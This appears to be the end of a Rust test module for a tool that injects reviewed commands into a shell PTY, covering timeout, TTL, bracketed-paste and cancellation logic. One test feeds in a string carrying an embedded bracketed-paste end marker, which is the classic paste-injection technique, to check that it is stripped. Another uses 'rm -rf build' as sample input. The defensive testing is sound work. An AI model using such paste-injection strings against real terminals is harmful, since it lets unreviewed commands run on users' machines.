        assert_eq!(poll_pending(&p, t0 + INJECT_TIMEOUT, 0, false), Verdict::Wait);
    }

    #[test]
    fn poll_timeout_fires_unbracketed_only_without_integration_single_line() {
        let t0 = Instant::now();
        // No integration, single line: fires unbracketed at the timeout.
        let p = pending("echo hi", true, t0, false);
        assert_eq!(poll_pending(&p, t0 + INJECT_TIMEOUT, 0, false), Verdict::FireUnbracketed);
        assert_eq!(
            poll_pending(&p, t0 + INJECT_TIMEOUT - Duration::from_millis(1), 0, false),
            Verdict::Wait
        );
        // Integration expected: the blind timeout NEVER fires.
        let p = pending("echo hi", true, t0, true);
        assert_eq!(poll_pending(&p, t0 + INJECT_TIMEOUT, 0, false), Verdict::Wait);
        // Multiline never takes the unbracketed path, integration or not.
        let m = pending("a\nb", false, t0, false);
        assert_eq!(poll_pending(&m, t0 + INJECT_TIMEOUT, 0, false), Verdict::Wait);
    }

    #[test]
    fn poll_timeout_fires_bracketed_opportunistically_without_integration() {
        // No integration marks will ever come, but the shell DID enable ?2004h
        // by the timeout: fire BRACKETED — strictly safer than raw, and it
        // lets a multiline STAGE here instead of refusing 10s later at TTL.
        let t0 = Instant::now();
        let p = pending("echo hi", true, t0, false);
        assert_eq!(poll_pending(&p, t0 + INJECT_TIMEOUT, 0, true), Verdict::Fire);
        let m = pending("a\nb", false, t0, false);
        assert_eq!(poll_pending(&m, t0 + INJECT_TIMEOUT, 0, true), Verdict::Fire);
        // Before the timeout it still waits (no premature fire on 2004h alone —
        // the mark path handles integrated shells).
        assert_eq!(
            poll_pending(&m, t0 + INJECT_TIMEOUT - Duration::from_millis(1), 0, true),
            Verdict::Wait
        );
        // Integration expected: the timeout path never fires, bracketed or not.
        let p = pending("echo hi", true, t0, true);
        assert_eq!(poll_pending(&p, t0 + INJECT_TIMEOUT, 0, true), Verdict::Wait);
    }

    #[test]
    fn poll_ttl_checked_before_fire_late_mark_drops() {
        let t0 = Instant::now();
        let p = pending("echo hi", true, t0, true);
        // Mark + 2004 arrive at TTL + 1ms — must DROP, not fire.
        let late = t0 + INJECT_TTL + Duration::from_millis(1);
        assert_eq!(poll_pending(&p, late, 1, true), Verdict::Drop);
    }

    #[test]
    fn poll_ttl_multiline_refuses_with_feedback() {
        let t0 = Instant::now();
        let m = pending("a\nb", false, t0, false);
        assert_eq!(poll_pending(&m, t0 + INJECT_TTL, 0, false), Verdict::Refuse);
        // Single-line TTL is a silent drop.
        let p = pending("echo hi", true, t0, false);
        assert_eq!(poll_pending(&p, t0 + INJECT_TTL, 0, true), Verdict::Drop);
    }

    #[test]
    fn poll_type_mode_single_line_truncated_never_unbracketed_times_out() {
        // A truncated single-line pending is Type mode (`run == false`). The
        // unbracketed fallback is Run-only, so it waits for bracketed
        // readiness and drops at TTL.
        let t0 = Instant::now();
        let p = pending("echo hi", false, t0, false);
        assert_eq!(poll_pending(&p, t0 + INJECT_TIMEOUT, 0, false), Verdict::Wait);
        assert_eq!(poll_pending(&p, t0 + INJECT_TTL, 0, false), Verdict::Drop);
    }

    // ── deadline ─────────────────────────────────────────────────────────────

    #[test]
    fn deadline_timeout_only_for_no_integration_single_line_run() {
        let t0 = Instant::now();
        assert_eq!(pending("x", true, t0, false).deadline(), t0 + INJECT_TIMEOUT);
        assert_eq!(pending("x", true, t0, true).deadline(), t0 + INJECT_TTL);
        assert_eq!(pending("a\nb", false, t0, false).deadline(), t0 + INJECT_TTL);
        assert_eq!(pending("x", false, t0, false).deadline(), t0 + INJECT_TTL);
    }

    // ── fire_pending (byte-exact wire format) ────────────────────────────────

    #[test]
    fn fire_bracketed_run_wraps_and_appends_cr_after_close() {
        let mut w: Vec<u8> = Vec::new();
        assert!(fire_pending(&mut w, "echo hi", true, true).unwrap());
        assert_eq!(w, b"\x1b[200~echo hi\x1b[201~\r");
    }

    #[test]
    fn fire_bracketed_type_no_cr() {
        let mut w: Vec<u8> = Vec::new();
        assert!(fire_pending(&mut w, "a\nb", false, true).unwrap());
        assert_eq!(w, b"\x1b[200~a\nb\x1b[201~");
    }

    #[test]
    fn fire_bracketed_keeps_tab_literal() {
        let mut w: Vec<u8> = Vec::new();
        assert!(fire_pending(&mut w, "a\tb", true, true).unwrap());
        assert_eq!(w, b"\x1b[200~a\tb\x1b[201~\r");
    }

    #[test]
    fn fire_unbracketed_converts_tab_to_space() {
        // BLOCKING 7: a raw \t would trigger readline completion on the
        // no-2004 path — the executed line must equal the reviewed one.
        let mut w: Vec<u8> = Vec::new();
        assert!(fire_pending(&mut w, "clean:\trm -rf build", true, false).unwrap());
        assert_eq!(w, b"clean: rm -rf build\r");
    }

    #[test]
    fn fire_unbracketed_type_no_cr() {
        let mut w: Vec<u8> = Vec::new();
        assert!(fire_pending(&mut w, "echo hi", false, false).unwrap());
        assert_eq!(w, b"echo hi");
    }

    #[test]
    fn fire_unbracketed_refuses_multiline_writes_nothing() {
        let mut w: Vec<u8> = Vec::new();
        assert!(!fire_pending(&mut w, "a\nb", true, false).unwrap());
        assert!(w.is_empty(), "raw interior newlines must never reach a PTY");
    }

    #[test]
    fn fire_bracketed_strips_embedded_end_marker_last_writer_invariant() {
        // Cannot occur post-sanitize (ESC is stripped), but the LAST writer
        // before the PTY strips anyway so a future regression can't reopen the
        // classic paste injection.
        let mut w: Vec<u8> = Vec::new();
        assert!(fire_pending(&mut w, "a\x1b[201~b", false, true).unwrap());
        assert_eq!(w, b"\x1b[200~ab\x1b[201~");
    }

    // ── cancel ───────────────────────────────────────────────────────────────

    #[test]
    fn user_write_cancels_pending_and_later_mark_fires_nothing() {
        // The pure cancel sequence: arm → user byte → pending gone → a later
        // readiness signal has nothing to fire.
        let t0 = Instant::now();
        let mut slot = Some(pending("echo hi", true, t0, true));
        cancel_on_user_write(&mut slot);
        assert!(slot.is_none());
        // Idempotent on an empty slot.
        cancel_on_user_write(&mut slot);
        assert!(slot.is_none());
    }
}
